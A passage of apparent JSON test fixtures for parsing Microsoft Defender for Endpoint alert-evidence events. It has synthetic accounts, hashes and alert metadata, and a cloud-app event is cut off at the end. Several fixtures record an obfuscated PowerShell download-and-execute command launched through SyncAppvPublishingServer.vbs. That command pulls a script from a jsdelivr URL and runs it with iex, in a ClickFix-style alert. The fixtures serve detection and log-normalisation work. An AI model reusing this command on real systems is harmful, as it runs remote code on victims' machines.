            "command_line": "\"powershell.exe\" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')}",
            "name": "powershell.exe",
            "parent": {
                "command_line": "\"WScript.exe\" \"C:\\WINDOWS\\system32\\SyncAppvPublishingServer.vbs\" \"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\"",
                "pid": 25976
            },
            "pid": 8988
        },
        "related": {
            "hash": [
                "3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8",
                "7c04ec2377e32b3c7742f581f6c5437464dd2cf2"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "EDR"
        }
    }
    	
	```


=== "test_alert_evidence_user_remediation.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:40:52.1545223Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:40:52.1240000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:36.2236631Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"User\",\"EvidenceRole\":\"Impacted\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":\"JohnDoe\",\"AccountDomain\":\"EXAMPLE.local\",\"AccountSid\":\"S-1-5-21-111111111-111111111-111111111-1111\",\"AccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"Name\\\":\\\"JohnDoe\\\",\\\"NTDomain\\\":\\\"EXAMPLE.local\\\",\\\"UPNSuffix\\\":\\\"example.com\\\",\\\"Host\\\":{\\\"$id\\\":\\\"2\\\",\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"},\\\"Sid\\\":\\\"S-1-5-21-111111111-111111111-111111111-1111\\\",\\\"AadUserId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"IsDomainJoined\\\":true,\\\"DisplayName\\\":\\\"John Doe\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"account\\\",\\\"UserPrincipalName\\\":\\\"john.doe@example.com\\\",\\\"Role\\\":0,\\\"ReferenceId\\\":\\\"33333333-3333-3333-3333-333333333333:111111111111\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"MergeByKey\\\":\\\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\\\",\\\"MergeByKeyHex\\\":\\\"1111111111111111111111111111111111111111\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":\"john.doe@example.com\",\"OAuthApplicationId\":null,\"Categories\":\"[\\\"Discovery\\\"]\",\"Title\":\"Suspicious Process Discovery\",\"AttackTechniques\":\"[\\\"Process Discovery (T1057)\\\",\\\"PowerShell (T1059.001)\\\"]\",\"DetectionSource\":\"EDR\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:36.223663Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-5-21-111111111-111111111-111111111-1111",
                "AccountUPN": "john.doe@example.com",
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious Process Discovery"
                },
                "entity": {
                    "type": "User"
                },
                "evidence": {
                    "role": "Impacted"
                },
                "threat": {
                    "detection_status": "Detected",
                    "host": {
                        "last_remediation_state": "Active",
                        "remediation_providers": [
                            {
                                "RemediationDate": "2026-01-13T09:40:40.9701986Z",
                                "RemediationState": "Active",
                                "Type": "remediation-provider"
                            }
                        ]
                    },
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:40:40.9701986Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "related": {
            "user": [
                "JohnDoe"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "EDR"
        },
        "user": {
            "domain": "EXAMPLE.local",
            "id": "22222222-2222-2222-2222-222222222222",
            "name": "JohnDoe"
        }
    }
    	
	```


=== "test_alert_evidence_user_suspicious_behavior.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:30:50.3449692Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:30:50.3110000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:16.9500123Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"User\",\"EvidenceRole\":\"Impacted\",\"SHA1\":null,\"SHA256\":null,\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":\"JohnDoe\",\"AccountDomain\":\"EXAMPLE.local\",\"AccountSid\":\"S-1-5-21-111111111-111111111-111111111-1111\",\"AccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"Name\\\":\\\"JohnDoe\\\",\\\"NTDomain\\\":\\\"EXAMPLE.local\\\",\\\"UPNSuffix\\\":\\\"example.com\\\",\\\"Host\\\":{\\\"$id\\\":\\\"2\\\",\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"},\\\"Sid\\\":\\\"S-1-5-21-111111111-111111111-111111111-1111\\\",\\\"AadUserId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"IsDomainJoined\\\":true,\\\"DisplayName\\\":\\\"John Doe\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:30:47.7219848Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"account\\\",\\\"UserPrincipalName\\\":\\\"john.doe@example.com\\\",\\\"Role\\\":0,\\\"ReferenceId\\\":\\\"33333333-3333-3333-3333-333333333333:111111111111\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"MergeByKey\\\":\\\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\\\",\\\"MergeByKeyHex\\\":\\\"1111111111111111111111111111111111111111\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":null,\"FolderPath\":null,\"ProcessCommandLine\":null,\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":\"john.doe@example.com\",\"OAuthApplicationId\":null,\"Categories\":\"[\\\"SuspiciousActivity\\\"]\",\"Title\":\"Suspicious 'SuspClickFix' behavior was blocked\",\"AttackTechniques\":\"\",\"DetectionSource\":\"Antivirus\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:16.950012Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-5-21-111111111-111111111-111111111-1111",
                "AccountUPN": "john.doe@example.com",
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious 'SuspClickFix' behavior was blocked"
                },
                "entity": {
                    "type": "User"
                },
                "evidence": {
                    "role": "Impacted"
                },
                "threat": {
                    "detection_status": "Detected",
                    "host": {
                        "last_remediation_state": "Active",
                        "remediation_providers": [
                            {
                                "RemediationDate": "2026-01-13T09:30:47.7219848Z",
                                "RemediationState": "Active",
                                "Type": "remediation-provider"
                            }
                        ]
                    },
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:30:47.7219848Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "related": {
            "user": [
                "JohnDoe"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Antivirus"
        },
        "user": {
            "domain": "EXAMPLE.local",
            "id": "22222222-2222-2222-2222-222222222222",
            "name": "JohnDoe"
        }
    }
    	
	```


=== "test_alert_evidence_wscript_remediation.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-01-13T09:40:52.1578881Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertEvidence\",\"_TimeReceivedBySvc\":\"2026-01-13T09:40:52.1240000Z\",\"properties\":{\"Timestamp\":\"2026-01-13T09:28:36.2236631Z\",\"AlertId\":\"11111111-1111-1111-1111-111111111111_1\",\"EntityType\":\"Process\",\"EvidenceRole\":\"Related\",\"SHA1\":\"41e72a2192e95926546eb2ba5b8b7ac85186712b\",\"SHA256\":\"e0c960e80e123d4cb5ce0c2337be3548a09453c69edd79d767e0d2398d011e4a\",\"RemoteIP\":null,\"LocalIP\":null,\"RemoteUrl\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"DeviceId\":null,\"ThreatFamily\":null,\"EvidenceDirection\":null,\"AdditionalFields\":\"{\\\"ProcessId\\\":\\\"25976\\\",\\\"CommandLine\\\":\\\"\\\\\\\"WScript.exe\\\\\\\" \\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\SyncAppvPublishingServer.vbs\\\\\\\" \\\\\\\"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\\\\\\\"\\\",\\\"ElevationToken\\\":\\\"Default\\\",\\\"CreationTimeUtc\\\":\\\"2026-01-13T09:28:35.0599284Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"2\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\",\\\"Name\\\":\\\"wscript.exe\\\",\\\"Host\\\":{\\\"$id\\\":\\\"3\\\",\\\"DnsDomain\\\":\\\"example.local\\\",\\\"HostName\\\":\\\"hostname\\\",\\\"NetBiosName\\\":\\\"hostname.example.local\\\",\\\"OSFamily\\\":\\\"Windows\\\",\\\"OSVersion\\\":\\\"10.0\\\",\\\"IsDomainJoined\\\":true,\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"DetailedRoles\\\":[\\\"PrimaryDevice\\\"],\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"host\\\",\\\"LeadingHost\\\":true,\\\"Role\\\":0,\\\"MachineId\\\":\\\"11111111111111111111111111111111111111111111\\\",\\\"MachineIdType\\\":3,\\\"HostMachineId\\\":null,\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":false,\\\"MergeByKey\\\":\\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\\",\\\"MergeByKeyHex\\\":\\\"0000000000000000000000000000000000000000\\\"},\\\"SizeInBytes\\\":200704,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"4\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"41e72a2192e95926546eb2ba5b8b7ac85186712b\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"5\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"5de91618b84073b3d7fe534967a56fc5\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"6\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"e0c960e80e123d4cb5ce0c2337be3548a09453c69edd79d767e0d2398d011e4a\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2025-10-20T09:07:56.1413983Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"bfd9fa7f5bdd59697bd9b967efdaf556df576ae96eb675e97fb6e67e6d55665df57a5bd9feb7de95e6f9ee99aaaebf95b9ef9f95bdefbbe7b59aaaddb5ee7ba6\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T09:28:15.01559Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2025-10-20T09:07:56.1570612Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":68403,\\\"FirstSeen\\\":\\\"2025-09-16T23:21:11.9487847\\\"},\\\"Account\\\":{\\\"$id\\\":\\\"7\\\",\\\"Name\\\":\\\"JohnDoe\\\",\\\"NTDomain\\\":\\\"EXAMPLE.local\\\",\\\"UPNSuffix\\\":\\\"example.com\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Sid\\\":\\\"S-1-5-21-111111111-111111111-111111111-1111\\\",\\\"AadUserId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"IsDomainJoined\\\":true,\\\"DisplayName\\\":\\\"John Doe\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"Asset\\\":true,\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"account\\\",\\\"UserPrincipalName\\\":\\\"john.doe@example.com\\\",\\\"Role\\\":0,\\\"ReferenceId\\\":\\\"33333333-3333-3333-3333-333333333333:111111111111\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"MergeByKey\\\":\\\"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\\\",\\\"MergeByKeyHex\\\":\\\"1111111111111111111111111111111111111111\\\"},\\\"ParentProcess\\\":{\\\"$id\\\":\\\"8\\\",\\\"ProcessId\\\":\\\"20284\\\",\\\"CommandLine\\\":\\\"Explorer.EXE\\\",\\\"CreationTimeUtc\\\":\\\"2026-01-13T07:05:08.2477897Z\\\",\\\"ImageFile\\\":{\\\"$id\\\":\\\"9\\\",\\\"Directory\\\":\\\"C:\\\\\\\\Windows\\\",\\\"Name\\\":\\\"explorer.exe\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"SizeInBytes\\\":5621024,\\\"FileHashes\\\":[{\\\"$id\\\":\\\"10\\\",\\\"Algorithm\\\":\\\"SHA1\\\",\\\"Value\\\":\\\"2cc5e6bc0a3ea794b99c219eb94023849dbaf57a\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"11\\\",\\\"Algorithm\\\":\\\"MD5\\\",\\\"Value\\\":\\\"8ff1ea4c155f04a6d6d3c29859b17e60\\\",\\\"Type\\\":\\\"filehash\\\"},{\\\"$id\\\":\\\"12\\\",\\\"Algorithm\\\":\\\"SHA256\\\",\\\"Value\\\":\\\"494e3c72cf7654296596975a592a69fecd76f484eb5475da179546696dcb8354\\\",\\\"Type\\\":\\\"filehash\\\"}],\\\"CreatedTimeUtc\\\":\\\"2025-12-18T08:46:36.3363048Z\\\",\\\"Type\\\":\\\"file\\\",\\\"LsHash\\\":\\\"7fd9f66fabddaa6e7bd5aa67dfdaf555dfab6ade6ab575dd7f76766dafa5675ef66f9ae5bdf7ee66b6e99be5655f5d95b9ef9fa9beed7be6b95657d9faefabfa\\\",\\\"IsPe\\\":true,\\\"LastAccessTimeUtc\\\":\\\"2026-01-13T07:05:08.2627456Z\\\",\\\"LastWriteTimeUtc\\\":\\\"2025-12-18T08:46:36.4892155Z\\\",\\\"Publisher\\\":\\\"Microsoft Corporation\\\",\\\"KnownPrevalence\\\":70505,\\\"FirstSeen\\\":\\\"2025-12-09T18:09:56.3005626\\\"},\\\"Account\\\":{\\\"$ref\\\":\\\"7\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2026-01-13T07:05:08.2477897Z\\\",\\\"Type\\\":\\\"process\\\"},\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"CreatedTimeUtc\\\":\\\"2026-01-13T09:28:35.0599284Z\\\",\\\"RemediationProviders\\\":[{\\\"RemediationState\\\":\\\"Active\\\",\\\"RemediationDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\",\\\"Type\\\":\\\"remediation-provider\\\"}],\\\"LastRemediationState\\\":\\\"Active\\\",\\\"ThreatAnalysisSummary\\\":[{\\\"AnalyzersResult\\\":[],\\\"Verdict\\\":\\\"Suspicious\\\",\\\"AnalysisDate\\\":\\\"2026-01-13T09:40:40.9701986Z\\\"}],\\\"LastVerdict\\\":\\\"Suspicious\\\",\\\"RbacScopes\\\":{\\\"ScopesPerType\\\":{\\\"MachineGroupIds\\\":{\\\"Mode\\\":\\\"Any\\\",\\\"Scopes\\\":[\\\"9713\\\"]},\\\"Workloads\\\":{\\\"Mode\\\":\\\"All\\\",\\\"Scopes\\\":[\\\"Mdatp\\\"]}}},\\\"Type\\\":\\\"process\\\",\\\"ReferenceId\\\":\\\"44444444-4444-4444-4444-444444444444:222222222222\\\",\\\"DetectionStatus\\\":\\\"Detected\\\",\\\"SuspicionLevel\\\":\\\"Suspicious\\\",\\\"IsIoc\\\":true,\\\"Role\\\":1,\\\"MergeByKey\\\":\\\"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=\\\",\\\"MergeByKeyHex\\\":\\\"2222222222222222222222222222222222222222\\\"}\",\"MachineGroup\":null,\"NetworkMessageId\":null,\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"FileName\":\"wscript.exe\",\"FolderPath\":\"C:\\\\Windows\\\\System32\",\"ProcessCommandLine\":\"\\\"WScript.exe\\\" \\\"C:\\\\WINDOWS\\\\system32\\\\SyncAppvPublishingServer.vbs\\\" \\\"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\\\"\",\"EmailSubject\":null,\"ApplicationId\":null,\"Application\":null,\"DeviceName\":null,\"FileSize\":200704,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"AccountUpn\":null,\"OAuthApplicationId\":null,\"Categories\":\"[\\\"Discovery\\\"]\",\"Title\":\"Suspicious Process Discovery\",\"AttackTechniques\":\"[\\\"Process Discovery (T1057)\\\",\\\"PowerShell (T1059.001)\\\"]\",\"DetectionSource\":\"EDR\",\"Severity\":\"Low\",\"CloudResource\":null,\"CloudPlatform\":\"\",\"ResourceType\":null,\"ResourceID\":null,\"SubscriptionId\":\"\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_evidence",
            "kind": "enrichment",
            "type": [
                "indicator"
            ]
        },
        "@timestamp": "2026-01-13T09:28:36.223663Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "file": {
            "directory": "C:\\Windows\\System32",
            "hash": {
                "sha1": "41e72a2192e95926546eb2ba5b8b7ac85186712b",
                "sha256": "e0c960e80e123d4cb5ce0c2337be3548a09453c69edd79d767e0d2398d011e4a"
            },
            "name": "wscript.exe",
            "size": 200704
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "11111111-1111-1111-1111-111111111111_1",
                    "severity": "Low",
                    "title": "Suspicious Process Discovery"
                },
                "entity": {
                    "type": "Process"
                },
                "evidence": {
                    "role": "Related"
                },
                "threat": {
                    "detection_status": "Detected",
                    "last_remediation_state": "Active",
                    "remediation_providers": [
                        {
                            "RemediationDate": "2026-01-13T09:40:40.9701986Z",
                            "RemediationState": "Active",
                            "Type": "remediation-provider"
                        }
                    ],
                    "severity": "Low",
                    "suspicion_level": "Suspicious"
                }
            }
        },
        "process": {
            "args": [
                "\"C:\\WINDOWS\\system32\\SyncAppvPublishingServer.vbs\"",
                "\"n;&(gal",
                "'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\"",
                "*stM*)",
                "i*x)(&(gcm"
            ],
            "command_line": "\"WScript.exe\" \"C:\\WINDOWS\\system32\\SyncAppvPublishingServer.vbs\" \"n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr.net/gh/browse-fb-clock/folders-tree/dash')\"",
            "name": "wscript.exe",
            "parent": {
                "command_line": "Explorer.EXE",
                "pid": 20284
            },
            "pid": 25976
        },
        "related": {
            "hash": [
                "41e72a2192e95926546eb2ba5b8b7ac85186712b",
                "e0c960e80e123d4cb5ce0c2337be3548a09453c69edd79d767e0d2398d011e4a"
            ]
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "EDR"
        }
    }
    	
	```


=== "test_cloud_app.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-09-29T11:45:09.7408937Z\",\"tenantId\":\"55555555-5555-5555-5555-555555555555\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-CloudAppEvents\",\"properties\":{\"ActionType\":\"AirInvestigationData\",\"ApplicationId\":11161,\"AccountDisplayName\":\"airinvestigation\",\"AccountObjectId\":null,\"AccountId\":\"airinvestigation\",\"DeviceType\":null,\"OSPlatform\":null,\"IPAddress\":null,\"IsAnonymousProxy\":null,\"CountryCode\":null,\"City\":null,\"ISP\":null,\"UserAgent\":null,\"IsAdminOperation\":false,\"ActivityObjects\":[{\"Type\":\"Account\",\"Role\":\"Actor\",\"Name\":\"airinvestigation\",\"Id\":\"airinvestigation\",\"ApplicationId\":11161,\"ApplicationInstance\":0}],\"AdditionalFields\":{},\"ActivityType\":\"Basic\",\"ObjectName\":null,\"ObjectType\":null,\"ObjectId\":null,\"AppInstanceId\":0,\"AccountType\":\"Regular\",\"IsExternalUser\":false,\"IsImpersonated\":false,\"IPTags\":null,\"IPCate